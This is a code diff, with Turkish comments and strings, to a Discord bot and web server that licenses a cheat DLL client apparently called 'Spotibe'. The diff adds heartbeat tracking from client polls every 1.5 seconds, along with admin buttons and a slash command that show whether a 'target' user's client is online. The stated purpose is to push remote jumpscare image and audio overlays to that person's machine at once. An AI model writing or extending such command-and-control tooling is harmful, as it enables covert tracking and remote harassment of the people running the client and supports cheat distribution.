@@ -55,13 +55,14 @@ CREATE TABLE IF NOT EXISTS updates (
 """)
 conn.commit()
 
-# Jumpscare / Remote Overlay Sutunlari
+# Jumpscare / Remote Overlay / Canli Takip Sutunlari
 for col, col_type, default_val in [
     ("jumpscare_image_url", "TEXT", "NULL"),
     ("jumpscare_audio_url", "TEXT", "NULL"),
     ("pending_jumpscare", "INTEGER", "0"),
     ("last_triggered_at", "TEXT", "NULL"),
-    ("jumpscare_duration", "INTEGER", "4")
+    ("jumpscare_duration", "INTEGER", "4"),
+    ("last_seen_at", "TEXT", "NULL")
 ]:
     try:
         cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {col_type} DEFAULT {default_val}")
@@ -197,6 +198,25 @@ class DeleteLicenseModal(discord.ui.Modal, title="Lisans Sil"):
         except Exception as e:
             await interaction.response.send_message(f"❌ Hata: `{str(e)}`", ephemeral=True)
 
+def get_user_spotibe_status(last_seen_str):
+    if not last_seen_str:
+        return False, "⚪ **Hiç açılmadı**"
+    try:
+        last_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
+        diff = (datetime.utcnow() - last_dt).total_seconds()
+        if diff <= 8:
+            return True, "🟢 **Açık (Online)**"
+        elif diff < 60:
+            return False, f"🔴 **Kapalı** ({int(diff)} sn önce)"
+        elif diff < 3600:
+            return False, f"🔴 **Kapalı** ({int(diff // 60)} dk önce)"
+        elif diff < 86400:
+            return False, f"🔴 **Kapalı** ({int(diff // 3600)} sa önce)"
+        else:
+            return False, f"🔴 **Kapalı** ({int(diff // 86400)} gün önce)"
+    except Exception:
+        return False, "⚪ **Bilinmiyor**"
+
 class AuthControlView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -221,7 +241,7 @@ class AuthControlView(discord.ui.View):
             await interaction.response.send_message("❌ Sadece yetkililer kullanabilir.", ephemeral=True)
             return
 
-        cursor.execute("SELECT discord_id, hwid, expires_at FROM users")
+        cursor.execute("SELECT discord_id, hwid, expires_at, last_seen_at FROM users")
         rows = cursor.fetchall()
 
         if not rows:
@@ -232,7 +252,7 @@ class AuthControlView(discord.ui.View):
         embed = discord.Embed(title="📋 Kayıtlı Lisans Listesi", color=0x00FF00)
         desc = ""
         for r in rows:
-            d_id, hw, exp_str = r[0], r[1], r[2]
+            d_id, hw, exp_str, last_seen = r[0], r[1], r[2], r[3]
             hw_status = "✅ Kilitli" if hw else "⏳ F5 Bekliyor"
 
             if exp_str:
@@ -245,9 +265,35 @@ class AuthControlView(discord.ui.View):
             else:
                 dur_info = "♾️ Süresiz"
 
-            desc += f"• <@{d_id}> (`{d_id}`) | {hw_status} | {dur_info}\n"
+            is_online, spotibe_str = get_user_spotibe_status(last_seen)
+            online_tag = "🟢 Açık" if is_online else "🔴 Kapalı"
+
+            desc += f"• <@{d_id}> (`{d_id}`) | {hw_status} | {dur_info} | {online_tag}\n"
 
         embed.description = desc
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🎧 Spotibe Canlı Durumu", style=discord.ButtonStyle.success, custom_id="btn_spotibe_status")
+    async def btn_spotibe_status(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction):
+            await interaction.response.send_message("❌ Sadece yetkililer kullanabilir.", ephemeral=True)
+            return
+
+        cursor.execute("SELECT discord_id, hwid, last_seen_at FROM users")
+        rows = cursor.fetchall()
+        if not rows:
+            await interaction.response.send_message("Kayıtlı kullanıcı bulunmuyor.", ephemeral=True)
+            return
+
+        embed = discord.Embed(title="🎧 Spotibe Canlı İstemci Durumları", color=0x1DB954)
+        desc = ""
+        for r in rows:
+            d_id, hw, last_seen = r[0], r[1], r[2]
+            is_online, status_text = get_user_spotibe_status(last_seen)
+            desc += f"• <@{d_id}> (`{d_id}`): {status_text}\n"
+
+        embed.description = desc
+        embed.set_footer(text="Spotibe istemcisi açıkken her 1.5 saniyede bir canlı yoklama yapar.")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.button(label="🗑️ Lisans Sil", style=discord.ButtonStyle.gray, custom_id="btn_del_license")
@@ -270,7 +316,8 @@ async def slash_wh(interaction: discord.Interaction):
         description="**Yönetim Seçenekleri:**\n\n"
                     "• **➕ Yeni Lisans Ekle**: Süreli veya süresiz yeni üyelik açar.\n"
                     "• **🔄 HWID Sıfırla**: Kullanıcının HWID kilidini kaldırır.\n"
-                    "• **📜 Kayıtlı Lisanslar**: Kalan süreleri ve aktif kullanıcıları döker.",
+                    "• **📜 Kayıtlı Lisanslar**: Kalan süreleri ve aktif kullanıcıları döker.\n"
+                    "• **🎧 Spotibe Canlı Durumu**: Hedefin Spotibe'si şu an açık mı kapalı mı canlı bakar.",
         color=0xED4245
     )
     embed.set_footer(text="Mardin Private Auth • 7/24 Kesintisiz Koruma")
@@ -366,6 +413,34 @@ async def slash_wh_sil(interaction: discord.Interaction, kullanici: str):
     cursor.execute("DELETE FROM users WHERE discord_id = ?", (clean_id,))
     conn.commit()
     await interaction.response.send_message(f"🗑️ <@{clean_id}> lisansı tamamen silindi.")
+
+@bot.tree.command(name="spotibe_durum", description="Hedef kullanıcının Spotibe'sinin açık olup olmadığını kontrol eder.")
+@app_commands.describe(kullanici="Durumu sorgulanacak kullanıcı (@etiket veya Discord ID)")
+async def slash_spotibe_durum(interaction: discord.Interaction, kullanici: str):
+    if not is_admin(interaction):
+        await interaction.response.send_message("❌ Bu komutu sadece yetkililer kullanabilir.", ephemeral=True)
+        return
+
+    clean_id = kullanici.replace("<@", "").replace(">", "").replace("!", "").strip()
+    cursor.execute("SELECT last_seen_at, hwid FROM users WHERE discord_id = ?", (clean_id,))
+    row = cursor.fetchone()
+    if not row:
+        await interaction.response.send_message(f"❌ <@{clean_id}> veritabanında kayıtlı değil!", ephemeral=True)
+        return
+
+    last_seen, hwid = row[0], row[1]
+    is_online, status_text = get_user_spotibe_status(last_seen)
+
+    color = 0x2ECC71 if is_online else 0xE74C3C
+    embed = discord.Embed(
+        title="🎧 Spotibe Canlı Durum Sorgusu",
+        description=f"👤 **Kullanıcı:** <@{clean_id}> (`{clean_id}`)\n"
+                    f"🖥️ **Spotibe Durumu:** {status_text}\n"
+                    f"🔒 **HWID Kilit:** `{'Kilitli' if hwid else 'Serbest / Boş'}`\n\n"
+                    + ("⚡ *Kullanıcı şu an Spotibe'yi kullanıyor. Jumpscare veya anlık eylemler anında iletilir.*" if is_online else "⚠️ *Spotibe şu an kapalı. Açıldığı anda bekleyen bildirimler tetiklenir.*"),
+        color=color
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
 @bot.tree.command(name="guncelleme_yukle", description="Spotibe / hile icin guncel DLL yukler.")
@@ -576,7 +651,11 @@ async def handle_verify(request):
     except Exception as e:
         print(f"[-] Discord user fetch error: {e}")
 
-    # HWID EŞLEŞTİRME
+    # HWID EŞLEŞTİRME & Canli Takip
+    now_iso = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+    cursor.execute("UPDATE users SET last_seen_at = ? WHERE discord_id = ?", (now_iso, discord_id))
+    conn.commit()
+
     if not saved_hwid:
         cursor.execute("UPDATE users SET hwid = ?, updated_at = CURRENT_TIMESTAMP WHERE discord_id = ?", (hwid, discord_id))
         conn.commit()
@@ -688,6 +767,15 @@ async def handle_poll_events(request):
 
     if not hwid and not discord_id:
         return web.json_response({"event": "none"})
+
+    # Spotibe canli kalp atisi (Heartbeat): last_seen_at guncelle
+    now_iso = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+    cursor.execute("""
+        UPDATE users 
+        SET last_seen_at = ? 
+        WHERE (hwid = ? AND ? != '') OR (discord_id = ? AND ? != '')
+    """, (now_iso, hwid, hwid, discord_id, discord_id))
+    conn.commit()
 
     cursor.execute("""
         SELECT pending_jumpscare, jumpscare_image_url, jumpscare_audio_url, jumpscare_duration, discord_id 
